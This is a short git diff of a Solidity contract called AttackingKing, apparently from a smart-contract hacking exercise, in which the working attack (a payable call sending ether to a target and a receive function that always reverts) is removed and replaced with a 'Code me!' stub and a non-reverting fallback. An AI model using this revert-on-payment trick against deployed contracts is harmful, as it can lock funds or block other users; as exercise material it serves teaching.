@@ -12,16 +12,10 @@ contract AttackingKing {
 
     function hackContract() external {
         // Code me!
-        // Don't send more than 100 eth
-        console.log("contractAddress: %s", contractAddress);
-        (bool result, ) = payable(contractAddress).call{
-            value: 3 ether,
-            gas: 1000000
-        }("");
     }
 
-    receive() external payable {
-        console.log("inside fallback");
-        revert();
+    fallback() external payable {
+        console.log("FALLBACK");
+        // revert();
     }
 }
